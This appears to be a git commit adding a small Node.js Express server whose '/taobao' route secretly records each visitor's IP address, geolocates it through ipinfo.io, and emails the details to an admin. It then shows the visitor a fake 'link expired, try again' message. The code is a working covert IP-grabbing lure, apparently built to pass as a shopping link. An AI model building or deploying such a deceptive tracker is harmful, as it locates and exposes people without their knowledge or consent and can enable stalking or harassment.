a64523a574d0d60de3e0ba617b8529ecbe455b3a
so <74056738+es3344520@users.noreply.github.com>
2025-01-09 22:03:52 +0800

    Create index.js

---
+++ index.js
@@ -0,0 +1,48 @@
+const express = require('express');
+const axios = require('axios');
+const bodyParser = require('body-parser');
+const querystring = require('querystring');
+
+const app = express();
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+
+const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
+const SENDCLOUD_API_USER = process.env.SENDCLOUD_API_USER;
+const SENDCLOUD_API_KEY = process.env.SENDCLOUD_API_KEY;
+const ADMIN_EMAIL = process.env.ADMIN_EMAIL;
+
+app.get('/taobao', async (req, res) => {
+  try {
+    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+
+    const ipInfoResponse = await axios.get(`https://ipinfo.io/${clientIp}?token=${IPINFO_TOKEN}`);
+    const ipData = ipInfoResponse.data;
+
+    const emailContent = `
+      <p>B用户访问信息:</p>
+      <pre>${JSON.stringify(ipData, null, 2)}</pre>
+    `;
+
+    const sendMailResponse = await axios.post('https://api.sendcloud.net/apiv2/mail/send', querystring.stringify({
+      apiUser: SENDCLOUD_API_USER,
+      apiKey: SENDCLOUD_API_KEY,
+      from: 'SendCloud@eixcst.sendcloud.org',
+      to: ADMIN_EMAIL,
+      subject: '新用户访问通知',
+      html: emailContent
+    }), {
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+    });
+
+    res.send('链接失效了，重新获取吧！');
+  } catch (error) {
+    console.error(error);
+    res.status(500).send('服务器错误，请稍后再试。');
+  }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`服务器正在运行在端口 ${PORT}`);
+});
